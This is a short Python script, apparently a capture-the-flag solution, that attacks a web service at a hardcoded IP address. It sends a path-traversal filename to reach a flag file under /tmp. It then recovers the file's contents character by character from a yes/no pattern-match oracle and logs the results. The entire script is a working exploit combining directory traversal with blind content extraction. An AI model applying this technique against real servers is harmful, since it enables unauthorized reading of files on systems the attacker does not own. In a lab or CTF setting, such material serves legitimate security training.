import requests

url = "http://46.101.221.164:8080/"
filename = "../../../tmp/flag_21e0e99ddec45ab7a40a675175e2704d.txt"
characters = """ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_@!#$%^&*()[]-+=|;:,.<>/?~ \n\t\r'"\`\\"""

def check_pattern(pattern, line_number):
    data = {
        "filename": filename,
        "pattern": pattern
    }
    response = requests.post(url, data=data)
    return f"Line: {line_number}" in response.text

def print_and_log(message, file):
    print(message)
    file.write(message + '\n')
    file.flush()

def find_line_content(line_number, output_file):
    known_content = ""
    while True:
        found = False
        for char in characters:
            test_pattern = known_content + char
            if check_pattern(test_pattern, line_number):
                known_content = test_pattern
                print_and_log(f"Content found so far on line {line_number}: {repr(known_content)}", output_file)
                found = True
                if char == '\n':
                    print_and_log(f"End of line {line_number} found.", output_file)
                    return known_content
                break
        if not found:
            if known_content:
                print_and_log(f"No match found. Resetting search for line {line_number}.", output_file)
                known_content = ""
            else:
                print_and_log(f"No content found for line {line_number}.", output_file)
                return None

def main():
    with open('output.txt', 'w') as output_file:
        for line_number in range(1, 13):  # Check lines 1 to 12
            print_and_log(f"Searching content for line {line_number}", output_file)
            line_content = find_line_content(line_number, output_file)
            
            if line_content:
                print_and_log(f"Complete line content found for line {line_number}: {repr(line_content)}", output_file)
            else:
                print_and_log(f"No content found for line {line_number}.", output_file)
    
    print("Line content discovery process completed. Check output.txt for the full log.")

if __name__ == "__main__":
    main()
